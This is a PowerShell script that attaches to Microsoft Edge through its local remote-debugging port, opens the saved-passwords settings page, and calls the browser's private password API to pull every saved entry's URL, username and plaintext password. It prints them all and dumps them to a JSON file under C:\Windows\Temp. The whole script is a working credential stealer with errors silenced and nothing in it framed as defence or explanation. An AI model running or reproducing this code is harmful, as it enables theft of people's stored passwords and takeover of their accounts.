$ErrorActionPreference='SilentlyContinue'
$t=(curl.exe -s http://127.0.0.1:9222/json/list|ConvertFrom-Json)|?{$_.type -eq 'page'}|Select-Object -First 1
if(-not $t){Write-Output "NO_TARGET";exit}
Write-Output "TARGET: $($t.url)"
$ws=New-Object System.Net.WebSockets.ClientWebSocket
$ct=[System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$t.webSocketDebuggerUrl,$ct).Wait()
$rbuf=[byte[]]::new(10485760)
$i=0
function S($m){$script:i++;$m.id=$script:i;$j=ConvertTo-Json -Compress -InputObject $m -Depth 10;$b=[Text.Encoding]::UTF8.GetBytes($j);$s=[ArraySegment[byte]]::new($b);$ws.SendAsync($s,'Text',$true,$ct).Wait();Start-Sleep -Milliseconds 500;$r=$ws.ReceiveAsync([ArraySegment[byte]]::new($rbuf),$ct).Result;return [Text.Encoding]::UTF8.GetString($rbuf,0,$r.Count)}

# Navigate
$null=S @{method='Page.enable'}
$null=S @{method='Runtime.enable'}
$null=S @{method='Page.navigate';params=@{url='edge://settings/passwords'}}
Start-Sleep 20
$null=S @{method='Runtime.enable'}
Start-Sleep 5

# Check
$r=S @{method='Runtime.evaluate';params=@{expression='location.href';returnByValue=$true}}
$u=($r|ConvertFrom-Json).result.result.value
Write-Output "URL: $u"

$r=S @{method='Runtime.evaluate';params=@{expression='!!chrome.passwordsPrivate';returnByValue=$true}}
$pp=($r|ConvertFrom-Json).result.result.value
Write-Output "passwordsPrivate: $pp"

if($pp -ne $true){Write-Output "NO API";$ws.Dispose();exit}

# Get list
$listCode='new Promise(r=>chrome.passwordsPrivate.getSavedPasswordList(l=>r(JSON.stringify(l||[]))))'
$r=S @{method='Runtime.evaluate';params=@{expression=$listCode;awaitPromise=$true;returnByValue=$true}}
$lv=($r|ConvertFrom-Json).result.result.value
Write-Output "LIST: $lv"

if(-not $lv -or $lv -eq 'null' -or $lv -eq '[]'){Write-Output "EMPTY_LIST";$ws.Dispose();exit}
$entries=$lv|ConvertFrom-Json
Write-Output "[+] $($entries.Count) entries"

# Extract each
$out=New-Object System.Collections.ArrayList
foreach($e in $entries){
    $eid=$e.id
    $eu=if($e.urls){$e.urls[0]}else{'?'}
    $eu2=$e.username
    Write-Output "[$($out.Count+1)/$($entries.Count)] $eu ($eu2)..."

    $ptCode="new Promise(r=>chrome.passwordsPrivate.requestPlaintextPassword($eid,'VIEW',pw=>r(JSON.stringify({p:pw}))))"
    $r2=S @{method='Runtime.evaluate';params=@{expression=$ptCode;awaitPromise=$true;returnByValue=$true}}
    $ptv=($r2|ConvertFrom-Json).result.result.value
    $pw=if($ptv){($ptv|ConvertFrom-Json).p}else{$null}

    $null=$out.Add([PSCustomObject]@{url=$eu;user=$eu2;pass=$pw})
    Write-Output "  PASSWORD: $pw"
    Start-Sleep -Milliseconds 300
}

Write-Output ""
Write-Output "================================================================"
foreach($o in $out){Write-Output "  $($o.url) | $($o.user) | $($o.pass)"}
$json=$out|ConvertTo-Json -Depth 5
$json|Out-File C:\Windows\Temp\ziti\pwd_dump.json -Encoding utf8
Write-Output ""
Write-Output "[+] $($out.Count) passwords dumped"
$ws.Dispose()